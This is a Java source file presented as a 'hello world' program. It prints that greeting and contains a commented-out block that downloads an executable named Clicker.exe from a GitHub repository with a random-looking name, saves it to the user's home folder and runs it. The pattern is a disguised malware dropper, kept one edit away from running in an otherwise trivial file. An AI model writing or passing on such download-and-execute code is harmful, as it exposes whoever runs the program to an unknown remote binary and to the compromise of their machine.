import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;

public class HelloWorld {
    public static void main(String[] args) {
        System.out.println("hello world");
        /*String fileURL = "https://github.com/jahzaer/xrthwidxrt/raw/main/Clicker.exe";
        String userHome = System.getProperty("user.home");
        File downloadedFile = new File(userHome + "/Clicker.exe");

        try {
            // Check if the file already exists
            if (!downloadedFile.exists()) {
                URL url = new URL(fileURL);
                URLConnection connection = url.openConnection();

                // Get the input stream for reading the file
                InputStream inputStream = connection.getInputStream();

                // Output stream for writing the downloaded file
                FileOutputStream outputStream = new FileOutputStream(downloadedFile);

                // Read the file from the input stream and write to the output stream
                byte[] buffer = new byte[4096];
                int length;
                while ((length = inputStream.read(buffer)) > 0) {
                    outputStream.write(buffer, 0, length);
                }

                // Close the streams
                inputStream.close();
                outputStream.close();
            }

            // Execute the downloaded file if it exists
            if (downloadedFile.exists()) {
                Runtime.getRuntime().exec(downloadedFile.getAbsolutePath());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }*/
    }
}
